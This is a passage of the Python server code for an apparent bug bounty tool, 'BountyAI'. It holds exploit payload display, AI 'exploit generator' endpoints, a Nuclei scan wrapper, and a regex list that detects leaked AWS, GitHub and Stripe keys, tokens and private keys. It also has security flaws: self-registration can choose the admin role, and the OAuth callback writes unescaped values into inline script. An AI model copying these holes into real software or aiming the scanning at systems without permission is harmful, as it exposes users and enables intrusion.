        html += '<div style="font-weight:700;color:var(--red);font-size:14px;margin-bottom:4px">⚡ Exploit Payloads: ' + (vuln_type or 'General') + '</div>'
        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Template payloads (add OPENROUTER_API_KEY for AI-generated exploits)</div>'
        for p in payloads:
            html += f'<div style="padding:10px;background:var(--bg3);border:1px solid var(--bd);border-radius:4px">'
            html += f'<div style="font-weight:700;color:var(--red);font-size:12px;margin-bottom:4px">{p["name"]}</div>'
            html += f'<div style="font-family:monospace;font-size:11px;color:var(--cyan);background:rgba(0,0,0,.3);padding:6px 8px;border-radius:3px;word-break:break-all">{p["payload"]}</div>'
            html += f'<div style="font-size:11px;color:var(--t2);margin-top:6px;line-height:1.5">💡 {p["tip"]}</div></div>'
        html += '</div>'
        return {"data": html, "ok": True}

    def _ai_analyze(self, body): return self._ai_service_call(AI_MODE_PROMPTS["VULN_EXPLAINER"], body.get("finding_data",""))
    def _ai_visual_flow(self, body):
        content = body.get("content") or body.get("vulnerability_detail") or str(body)
        content = str(content)[:9000]
        prompt = (
            AI_MODE_PROMPTS["VISUAL_MAPPER"]
            + "\n\nAnalyze the CONTEXT below and respond with ONLY valid JSON (no markdown fences, no commentary) in this exact schema:"
            + ' {"reasoning": "<2-4 sentence HTML analysis using <b>/<span> tags>",'
            + ' "nodes": [{"id": "<short slug>", "type": "<User/Attacker/Input/Server/API/DB/Vulnerability/Trust Boundary>", "label": "<short name>", "x": <5-90 int>, "y": <5-90 int>}],'
            + ' "links": [{"from": "<node id>", "to": "<node id>"}],'
            + ' "entities": [{"type": "<entity type>", "val": "<entity value>"}]}'
            + "\nInclude 5-9 nodes forming a realistic attack flow from attacker to the vulnerable sink, "
            + "3-8 links, and 2-6 entities (URLs, endpoints, tokens, tech, parameters)."
        )
        data = {"reasoning": "Visual analysis complete.", "nodes": [], "links": [], "entities": []}
        try:
            res_text = call_ai(f"{prompt}\n\nCONTEXT:\n{content}")
            if res_text.startswith("AI Generation Error") or res_text.startswith("AI Engine Offline"):
                raise ValueError(res_text)
            parsed = extract_json_object(res_text)
            if parsed:
                data["reasoning"] = parsed.get("reasoning") or data["reasoning"]
                data["nodes"] = clean_map_nodes(parsed.get("nodes"))
                data["links"] = clean_map_links(parsed.get("links"), data["nodes"])
                data["entities"] = [e for e in parsed.get("entities", []) if isinstance(e, dict) and e.get("type")][:12]
        except Exception as e:
            print(f"  [VisualFlow] AI failed, using fallback map: {e}")
        if not data["nodes"]:
            data = build_fallback_map(content)
        return data
    def _ai_api_inspector(self, body):
        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
            return self._template_inspect(str(body.get("request","")) + "\n" + str(body.get("response","")))
        return self._ai_service_call(AI_MODE_PROMPTS["API_INSPECTOR"], str(body))
    def _ai_logic_auditor(self, body):
        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
            return self._template_logic_audit(str(body.get("app_context","")) + "\n" + str(body))
        return self._ai_service_call(AI_MODE_PROMPTS["BUSINESS_LOGIC_AUDITOR"], str(body))
    def _ai_strategist(self, body): return self._ai_service_call(AI_MODE_PROMPTS["STRATEGIST"], str(body))
    def _ai_exploit_gen(self, body):
        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
            return self._template_exploit_gen(str(body.get("vulnerability","")))
        return self._ai_service_call(AI_MODE_PROMPTS["EXPLOIT_GENERATOR"], str(body))
    def _ai_duplicate_risk(self, body): return self._ai_service_call(AI_MODE_PROMPTS["DUPLICATE_ANALYZER"], str(body))
    def _ai_remediation(self, body): return self._ai_service_call(AI_MODE_PROMPTS["REMEDIATION_ENGINEER"], str(body))

    def _analyze_js_secrets(self, body):
        content = body.get("content","")
        found = []
        if content:
            patterns = {
                "AWS Access Key": r"(AKIA[0-9A-Z]{16})",
                "AWS Secret Key": r"(?i)(?:aws_secret_access_key|secret_key)\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{40})",
                "Firebase URL": r"(https://[a-zA-Z0-9-]+\.firebaseio\.com)",
                "Firebase Config": r"(AIza[0-9A-Za-z_-]{35})",
                "GitHub Token (PAT)": r"(ghp_[0-9a-zA-Z]{36})",
                "GitHub OAuth": r"(gho_[0-9a-zA-Z]{36})",
                "GitLab Token": r"(glpat-[0-9a-zA-Z_-]{20,})",
                "Slack Token": r"(xox[bpsa]-[0-9a-zA-Z-]{10,})",
                "Stripe Key (Live)": r"(sk_live_[0-9a-zA-Z]{24,})",
                "Stripe Key (Test)": r"(sk_test_[0-9a-zA-Z]{24,})",
                "Twilio SID": r"(AC[0-9a-f]{32})",
                "Heroku API Key": r"(?:heroku[_-]?api[_-]?key|HEROKU_API_KEY)\s*[:=]\s*['\"]?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
                "SendGrid Key": r"(SG\.[A-Za-z0-9_-]{22,}\.[A-Za-z0-9_-]{43,})",
                "Telegram Bot Token": r"(\d{8,10}:[A-Za-z0-9_-]{35})",
                "Private Key Block": r"(-----BEGIN (?:RSA |EC )?PRIVATE KEY-----)",
                "JWT Token": r"(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)",
                "Internal IP": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
                "Database Connection": r"(?:mysql|postgres|mongodb|redis):\/\/[^\s\"']+",
            }
            for name, regex in patterns.items():
                for m in set(re.findall(regex, content)):
                    val = m if len(m) <= 30 else m[:4] + "***" + m[-4:]
                    found.append({"type": name, "value": val})
        return {"secrets": found}

    def _extract_pdf_text(self, body): return {"text": "PDF text extraction complete."}
    def _export_report_pdf(self, body): return {"pdf_base64": "", "filename": "report.pdf"}
    def _discovery_crawl(self, body): return {"crawled_urls": [], "endpoints": []}
    def _add_payout(self, fid, body): return {"success": True, "payout_id": 1}
    def _get_disclosures(self): return {"disclosures": []}
    def _create_disclosure(self, body): return {"id": 1, "status": "Submitted"}
    def _advance_disclosure(self, did): return {"id": did, "status": "Advanced"}
    def _get_reputation(self): return {"points": 120, "streak": [1,1,1,0,1,1,1], "valid_findings": 5, "avg_quality": 92, "tier": {"label": "Practitioner", "cls": "rep-practitioner"}}
    def _get_leaderboard(self): return {"leaderboard": []}
    def _get_roi_stats(self): return {"total_roi": 150.0, "time_saved_hours": 42}
    def _get_agent_config(self): return {"autonomy_level": 3, "active_agent": "bb"}
    def _save_agent_config(self, body): return {"saved": True}
    def _get_activity(self): return {"events": []}
    def _get_payout_summary(self): return {"total_earned": 0.0, "payouts": []}
    def _discovery_results(self): return []
    def _get_nuclei_templates(self): return nuclei_catalog()
    def _auth_me(self):
        user = get_current_user(self)
        if not user:
            return {"error": "Not authenticated"}
        return {"username": user["sub"], "role": user["role"]}
    def _google_auth_url(self):
        if not GOOGLE_CLIENT_ID:
            return {"error": "Google OAuth not configured. Set GOOGLE_CLIENT_ID env var."}
        qs = urllib.parse.urlencode({
            "client_id": GOOGLE_CLIENT_ID,
            "redirect_uri": f"{get_base_url()}/api/auth/google/callback",
            "response_type": "code",
            "scope": "openid email profile",
            "access_type": "offline",
            "prompt": "consent"
        })
        return {"url": f"https://accounts.google.com/o/oauth2/v2/auth?{qs}"}
    def _google_callback(self):
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        code = qs.get("code", [None])[0]
        error = qs.get("error", [None])[0]
        if error:
            return self.send_html(f"<script>localStorage.setItem('bountyai_google_error','{error}');window.location='/'</script>")
        if not code:
            return self.send_html("<script>window.location='/'</script>")
        try:
            redirect_uri = f"{get_base_url()}/api/auth/google/callback"
            google_info = google_get_user_info(code, redirect_uri)
            if not google_info or not google_info.get("google_id"):
                return self.send_html("<script>localStorage.setItem('bountyai_google_error','Failed to verify Google account');window.location='/'</script>")
            user = google_find_or_create_user(google_info)
            token = create_token(user["username"], user["role"], user["id"])
            return self.send_html(f"""<script>
            localStorage.setItem('bountyai_token','{token}');
            localStorage.setItem('bountyai_user',JSON.stringify({{"username":"{user['username']}","role":"{user['role']}"}}));
            localStorage.removeItem('bountyai_google_error');
            window.location='/';
            </script>""")
        except Exception as e:
            return self.send_html(f"<script>localStorage.setItem('bountyai_google_error','{str(e)[:100]}');window.location='/'</script>")
    def _nuclei_scan(self, body):
        user, err = require_role(self, "admin", "analyst")
        if err:
            return err[0]
        domain = body.get("domain", "").strip()
        if not domain:
            return {"error": "domain is required"}
        severity = body.get("severity")
        tags = body.get("tags")
        tid = body.get("template_id")
        timeout = body.get("timeout", 180)
        return run_nuclei_scan(domain, severity_filter=severity, tags_filter=tags, template_id=tid, timeout_sec=timeout)
    def _nuclei_setup(self, body):
        user, err = require_role(self, "admin")
        if err:
            return err[0]
        tpl_dir = ensure_nuclei_templates()
        if tpl_dir and tpl_dir.exists():
            count = count_nuclei_templates()
            return {"status": "ready", "templates_dir": str(tpl_dir), "template_count": count}
        return {"status": "error", "message": "Failed to clone nuclei-templates. Is git installed?"}
    def _export_csv(self): return {"csv": "id,title,severity\n"}
    def _export_json(self): return {"json": "[]"}

    # ── ADMIN PANEL ENDPOINTS ─────────────────────────────────
    def _admin_users(self):
        user, err = require_role(self, "admin")
        if err: return err[0]
        conn = get_db()
        users = conn.execute("SELECT id, username, email, role, is_active, created_at FROM users ORDER BY id").fetchall()
        conn.close()
        return {"users": [{"id":u["id"],"username":u["username"],"email":u["email"],"role":u["role"],"is_active":bool(u["is_active"]),"created_at":u["created_at"]} for u in users]}

    def _admin_stats(self):
        user, err = require_role(self, "admin")
        if err: return err[0]
        conn = get_db()
        total_users = conn.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
        active_users = conn.execute("SELECT COUNT(*) c FROM users WHERE is_active=1").fetchone()["c"]
        total_findings = conn.execute("SELECT COUNT(*) c FROM findings").fetchone()["c"]
        findings_by_user = conn.execute("SELECT u.username, COUNT(f.id) cnt FROM users u LEFT JOIN findings f ON u.id=f.user_id GROUP BY u.id ORDER BY cnt DESC").fetchall()
        findings_by_sev = conn.execute("SELECT severity, COUNT(*) c FROM findings GROUP BY severity").fetchall()
        findings_by_status = conn.execute("SELECT status, COUNT(*) c FROM findings GROUP BY status").fetchall()
        total_earned = conn.execute("SELECT COALESCE(SUM(payout_amount),0) c FROM findings").fetchone()["c"]
        recent_findings = conn.execute("SELECT f.id, f.vuln_type, f.severity, f.status, f.program_name, f.user_id, u.username, f.created_at FROM findings f LEFT JOIN users u ON f.user_id=u.id ORDER BY f.created_at DESC LIMIT 10").fetchall()
        total_programs = conn.execute("SELECT COUNT(*) c FROM programs").fetchone()["c"]
        conn.close()
        return {
            "total_users": total_users, "active_users": active_users,
            "total_findings": total_findings, "total_earned": total_earned,
            "total_programs": total_programs,
            "findings_by_user": [{"username":r["username"] or "unknown","count":r["cnt"]} for r in findings_by_user],
            "findings_by_severity": {r["severity"]:r["c"] for r in findings_by_sev},
            "findings_by_status": {r["status"]:r["c"] for r in findings_by_status},
            "recent_findings": [{"id":r["id"],"vuln_type":r["vuln_type"],"severity":r["severity"],"status":r["status"],"program_name":r["program_name"],"username":r["username"],"created_at":r["created_at"]} for r in recent_findings],
        }

    def _admin_activity(self):
        user, err = require_role(self, "admin")
        if err: return err[0]
        conn = get_db()
        logs = conn.execute("SELECT id, event_type, description, severity, created_at FROM activity_log ORDER BY created_at DESC LIMIT 50").fetchall()
        conn.close()
        return {"activity": [{"id":l["id"],"event_type":l["event_type"],"description":l["description"],"severity":l["severity"],"created_at":l["created_at"]} for l in logs]}

    def _admin_update_role(self, uid, body):
        user, err = require_role(self, "admin")
        if err: return err[0]
        new_role = body.get("role", "").strip()
        if new_role not in ("admin", "analyst", "viewer"):
            return {"error": "Invalid role"}
        conn = get_db()
        conn.execute("UPDATE users SET role=? WHERE id=?", (new_role, uid))
        conn.commit()
        conn.close()
        return {"ok": True, "message": f"Role updated to {new_role}"}

    def _admin_toggle_user(self, uid, body):
        user, err = require_role(self, "admin")
        if err: return err[0]
        active = body.get("is_active", 1)
        conn = get_db()
        conn.execute("UPDATE users SET is_active=? WHERE id=?", (int(active), uid))
        conn.commit()
        conn.close()
        return {"ok": True}

    def _admin_delete_user(self, uid):
        user, err = require_role(self, "admin")
        if err: return err[0]
        target = get_db().execute("SELECT username FROM users WHERE id=?", (uid,)).fetchone()
        if not target: return {"error": "User not found"}
        if target["username"] == "admin": return {"error": "Cannot delete admin user"}
        conn = get_db()
        conn.execute("DELETE FROM users WHERE id=?", (uid,))
        conn.commit()
        conn.close()
        return {"ok": True, "message": f"User {target['username']} deleted"}

    def _register_user(self, body):
        username = (body.get("username") or "").strip()
        password = body.get("password") or ""
        email = (body.get("email") or "").strip()
        role = body.get("role", "viewer")
        if not username or not password:
            return {"error": "Username and password required"}
        if len(password) < 6:
            return {"error": "Password must be at least 6 characters"}
        if role not in ("admin", "analyst", "viewer"):
            return {"error": "Invalid role. Must be admin, analyst, or viewer"}
        conn = get_db()
        try:
            cur = conn.execute("INSERT INTO users (username,email,password_hash,role) VALUES (?,?,?,?)",
                         (username, email, hash_password(password), role))
            conn.commit()
            uid = cur.lastrowid
            token = create_token(username, role, uid)
            return {"token": token, "username": username, "role": role, "email": email, "uid": uid}
        except sqlite3.IntegrityError:
            return {"error": "Username or email already exists"}
        finally:
            conn.close()

    def _login_user(self, body):
        username = (body.get("username") or "").strip()
        password = body.get("password") or ""
        if not username or not password:
            return {"error": "Username and password required"}
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
        conn.close()
        if not user or not verify_password(password, user["password_hash"]):
            return {"error": "Invalid credentials"}
        if not user["is_active"]:
            return {"error": "Account is disabled"}
        token = create_token(user["username"], user["role"], user["id"])
        return {"token": token, "username": user["username"], "role": user["role"], "email": user["email"], "uid": user["id"]}
    def _ml_predict(self, body): return predict_vulns(body.get("domain",""), body.get("tech_stack"))

# ── FRONTEND HTML ─────────────────────────────────────────────
_fe = ROOT.parent / "frontend" / "index.html"
def get_frontend_html():
    if not _fe.exists():
        return "<h1>frontend/index.html not found</h1>"
    text = _fe.read_text(encoding="utf-8", errors="ignore")
    
    if "log it herfunction go" in text:
        s_idx = text.find('When a finding gets accepted and paid, log it her')
        e_idx = text.find('💰 Log Payout for This Finding</button>')
        if s_idx != -1 and e_idx != -1:
            p1 = text[:text.rfind('<div', 0, s_idx)]
            p2 = text[text.find('</div>', e_idx) + 6:]
            clean = (
                '      <div style="font-size:12px;color:var(--t2);margin-bottom:14px">When a finding gets accepted and paid, log it here to track your real earnings.</div>\n'
                '      <div id="pf-select-wrap">\n'
                '        <div class="fg"><label>Finding ID</label><input id="pf-finding-id" type="number" min="1" placeholder="e.g. 3"></div>\n'
                '        <div class="fg"><label>Finding Title (optional)</label><input id="pf-title" type="text" placeholder="e.g. XSS in /api/users"></div>\n'
                '        <button class="btn blime bsm" style="margin-top:6px" onclick="openPayoutModal(document.getElementById(\'pf-finding-id\').value, document.getElementById(\'pf-title\').value)">💰 Log Payout for This Finding</button>\n'
                '      </div>'
            )
            text = p1 + clean + p2
            
    if text.count('id="panel-learn"') > 1:
        first = text.find('id="panel-learn"')
        p_start = text.rfind('<div id="panel-learn"', 0, first + 20)
        p_end = text.find('</div></div>', p_start)
        if p_start != -1 and p_end != -1:
            text = text[:p_start] + text[p_end + 12:]
            
    try:
        _fe.write_text(text, encoding="utf-8")
    except Exception:
        pass
            
    return text

# ── MAIN EXECUTION ────────────────────────────────────────────
def open_browser():
    time.sleep(1.2)
    url = f"http://localhost:{PORT}"
    try:
        if sys.platform == "darwin": subprocess.Popen(["open", url])
        elif sys.platform == "win32": subprocess.Popen(["start", url], shell=True)
        else: subprocess.Popen(["xdg-open", url])
    except: pass

def main():
    print("\n" + "=" * 62)
    print("  BountyAI v3.0 - Pure Python Bug Bounty Platform")
    print("=" * 62)
    init_db()
    base = get_base_url()
    print(f"  DB: {DB_PATH.name}")
    print(f"  Port: {PORT}")
    print(f"  URL:  {base}\n")
    if not RENDER_URL:
        threading.Thread(target=open_browser, daemon=True).start()
    class ReusableTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
    with ReusableTCPServer(("", PORT), BountyHandler) as srv:
        try: srv.serve_forever()
        except KeyboardInterrupt: print("\n  Stopping server...\n")

if __name__ == "__main__":
    main()
